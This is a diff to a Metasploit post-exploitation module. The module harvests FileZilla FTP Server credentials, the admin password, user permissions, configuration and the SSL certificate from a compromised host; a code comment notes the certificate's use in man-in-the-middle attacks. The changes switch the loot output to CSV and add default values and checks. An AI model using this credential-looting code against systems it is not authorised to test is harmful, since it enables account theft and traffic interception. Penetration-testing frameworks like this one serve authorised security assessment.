@@ -182,14 +182,14 @@ class Metasploit3 < Msf::Post
 				:target_port => config['admin_port']
 			)
 
-		store_loot("filezilla.server.creds", "text/plain", session.tunnel_peer, credentials.to_s, 
+		store_loot("filezilla.server.creds", "text/csv", session.tunnel_peer, credentials.to_csv, 
 			"filezilla_server_credentials.txt", "FileZilla FTP Server Credentials")
 
-		store_loot("filezilla.server.perms", "text/plain", session.tunnel_peer, permissions.to_s, 
-			"filezilla_server_permissions.txt", "FileZilla FTP Server Permissions")
+		store_loot("filezilla.server.perms", "text/csv", session.tunnel_peer, permissions.to_csv, 
+			"filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
 
-		store_loot("filezilla.server.config", "text/plain", session.tunnel_peer, configuration.to_s, 
-			"filezilla_server_configuration.txt", "FileZilla FTP Server Configuration")
+		store_loot("filezilla.server.config", "text/csv", session.tunnel_peer, configuration.to_csv, 
+			"filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
 	end
 
 	def parse_server(data)
@@ -204,9 +204,9 @@ class Metasploit3 < Msf::Post
 		doc = REXML::Document.new(data).root
 
 		items = doc.elements.to_a("//Settings//Item/")
-		settings['ftp_port'] = items[0].text
-		settings['admin_port'] = items[16].text
-		settings['admin_pass'] = items[17].text
+		settings['ftp_port'] = items[0].text rescue "<none>"
+		settings['admin_port'] = items[16].text rescue "<none>"
+		settings['admin_pass'] = items[17].text rescue "<none>"
 
 		if items[18].text # empty means localhost only * is 0.0.0.0
 			settings['admin_bindip'] = items[18].text
@@ -229,16 +229,16 @@ class Metasploit3 < Msf::Post
 		end
 
 		if items[42].text == "1"
-			settings['ssl'] = true
+			settings['ssl'] = "true"
 		else
 			if datastore['SSLCERT']
 				print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
 			end
-			settings['ssl'] = false
+			settings['ssl'] = "false"
 		end
 
 		settings['ssl_certfile'] = items[45].text rescue "<none>"
-		if settings['ssl_certfile'] != "<none>" and datastore['SSLCERT'] # lets get the file if its there could be useful in MITM attacks
+		if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT'] # lets get the file if its there could be useful in MITM attacks
 			sslfile = session.fs.file.new(settings['ssl_certfile'])
 			until sslfile.eof?
 				sslcert << sslfile.read
@@ -247,9 +247,17 @@ class Metasploit3 < Msf::Post
 				settings['ssl_cert'] + ".txt", "FileZilla Server SSL Certificate File" )
 			print_status("Looted SSL Certificate File")
 		end
+		
+		if settings['ssl_certfile'].nil?
+			settings['ssl_certfile'] = "<none>"
+		end
 
 		settings['ssl_keypass'] = items[50].text rescue "<none>"
-		
+
+		if settings['ssl_keypass'].nil?
+			settings['ssl_keypass'] = "<none>"
+		end
+
 		doc.elements['Users'].elements.each('User') do |user|
 			account = {}
 			account['user'] = user.attributes['Name'] rescue "<none>"
@@ -272,12 +280,12 @@ class Metasploit3 < Msf::Post
 				perm['dirdelete']  = opt[5].text rescue "<unknown>"
 				perm['dirlist']    = opt[6].text rescue "<unknown>"
 				perm['dirsubdirs'] = opt[7].text rescue "<unknown>"
-				perm['autocreate'] = opt[9].text rescue
+				perm['autocreate'] = opt[9].text rescue "<unknown>"
 
 				if opt[8].text == "1"
-					perm['home'] = true
+					perm['home'] = "true"
 				else
-					perm['home'] = false
+					perm['home'] = "false"
 				end
 				perms << perm
 
@@ -311,7 +319,6 @@ class Metasploit3 < Msf::Post
 			print_status("       Groups: %u" % groups.length)
 			print_line("")
 		end
-
 		return [creds, perms, settings]
 	end
 
